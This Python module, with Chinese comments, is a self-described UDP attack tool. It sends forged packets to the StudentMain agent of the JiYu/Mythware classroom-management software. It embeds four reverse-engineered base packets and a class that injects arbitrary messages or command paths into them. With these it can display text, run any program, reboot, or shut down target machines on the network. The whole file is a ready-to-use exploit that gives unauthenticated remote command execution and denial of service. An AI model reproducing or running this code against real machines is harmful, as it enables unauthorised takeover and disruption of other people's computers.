# -*- coding: utf-8 -*-
"""UDP 攻击模块：向极域 StudentMain 端口发送构造数据包（源自 JyUdpAttack.cpp）。

BASE_PACK 为原项目从极域 StudentMain 逆向出的 4 个基础数据包（128 字节）：
    msg(0): 发送消息，命令文本写在偏移 56（宽字符）
    cmd(1): 执行命令，路径 cmd.exe 写在偏移 100 起（宽字符）
    reboot(2) / shutdown(3)：无附加数据
用法：
    from lib.udpattack import UdpAttack
    atk = UdpAttack()
    atk.send_text(ip, port, "hello")
    atk.send_command(ip, port, "C:\\Windows\\System32\\calc.exe")
    atk.send_shutdown(ip, port) / atk.send_reboot(ip, port)
"""
import socket
import struct

SEND_BUFFER_SIZE = 1024

BASE_PACK_MSG = 0
BASE_PACK_CMD = 1
BASE_PACK_REBOOT = 2
BASE_PACK_SHUTDOWN = 3

# 4 个基础数据包（128 字节 ×4，从 JyUdpAttack.h 精确提取）
BASE_PACK = [
    # 0: MSG —— 文本写在偏移 56
    bytes([
        68,77,79,67,0,0,1,0,158,3,0,0,16,65,175,251,160,231,82,64,145,220,39,163,
        182,249,41,46,32,78,0,0,192,168,80,129,145,3,0,0,145,3,0,0,0,8,0,0,0,0,0,
        0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0]),
    # 1: CMD —— cmd.exe 路径写在偏移 100，可整体覆写为任意命令路径
    bytes([
        68,77,79,67,0,0,1,0,110,3,0,0,57,142,210,124,139,86,13,69,156,96,224,208,
        196,164,179,242,32,78,0,0,192,168,80,129,97,3,0,0,97,3,0,0,0,2,0,0,0,0,0,
        0,15,0,0,0,1,0,0,0,67,0,58,0,92,0,87,0,105,0,110,0,100,0,111,0,119,0,115,
        0,92,0,115,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,92,0,0,0,0,0,0,99,0,
        109,0,100,0,46,0,101,0,120,0,101,0,0,0,0,0,0,0,0,0,0]),
    # 2: REBOOT
    bytes([
        68,77,79,67,0,0,1,0,42,2,0,0,191,64,34,78,87,45,62,79,155,111,193,141,225,
        235,79,98,32,78,0,0,192,168,80,129,29,2,0,0,29,2,0,0,0,2,0,0,0,0,0,0,19,
        0,0,16,15,0,0,0,1,0,0,0,0,0,0,0,89,101,8,94,6,92,205,145,47,84,168,96,
        132,118,161,139,151,123,58,103,2,48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]),
    # 3: SHUTDOWN
    bytes([
        68,77,79,67,0,0,1,0,42,2,0,0,200,227,151,253,192,181,159,69,135,114,5,189,
        78,70,168,150,32,78,0,0,192,168,80,129,29,2,0,0,29,2,0,0,0,2,0,0,0,0,0,0,
        20,0,0,16,15,0,0,0,1,0,0,0,0,0,0,0,89,101,8,94,6,92,115,81,237,149,168,96,
        132,118,161,139,151,123,58,103,2,48,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]),
]

MSG_OFFSET = 56      # 消息文本宽字符偏移
CMD_OFFSET = 100     # 命令路径宽字符偏移
PACK_BUFFER_SIZE = 128


class UdpAttack:
    """极域 UDP 协议发包器。"""

    def __init__(self, timeout=1.0):
        self.timeout = timeout

    # ---------------- 数据包构造 ----------------

    def _build(self, kind, payload_w=None, offset=0):
        """构造发送缓冲：basePack + 可选宽字符负载。"""
        buf = bytearray(BASE_PACK[kind]) + bytes(SEND_BUFFER_SIZE
                                                 - PACK_BUFFER_SIZE)
        if payload_w is not None:
            data = payload_w.encode("utf-16-le") + b"\x00\x00"
            buf[offset:offset + len(data)] = data
        return bytes(buf)

    def pack_text(self, text):
        return self._build(BASE_PACK_MSG, text, MSG_OFFSET)

    def pack_command(self, cmdline):
        return self._build(BASE_PACK_CMD, cmdline, CMD_OFFSET)

    def pack_shutdown(self):
        return self._build(BASE_PACK_SHUTDOWN)

    def pack_reboot(self):
        return self._build(BASE_PACK_REBOOT)

    # ---------------- 发送 ----------------

    def _sendto(self, ip, port, data):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.timeout)
        try:
            sock.sendto(data, (ip, int(port)))
            return {"ok": True, "bytes": len(data)}
        except OSError as e:
            return {"ok": False, "error": str(e)}
        finally:
            sock.close()

    def send_text(self, ip, port, text):
        return self._sendto(ip, port, self.pack_text(text))

    def send_command(self, ip, port, cmdline):
        return self._sendto(ip, port, self.pack_command(cmdline))

    def send_shutdown(self, ip, port):
        return self._sendto(ip, port, self.pack_shutdown())

    def send_reboot(self, ip, port):
        return self._sendto(ip, port, self.pack_reboot())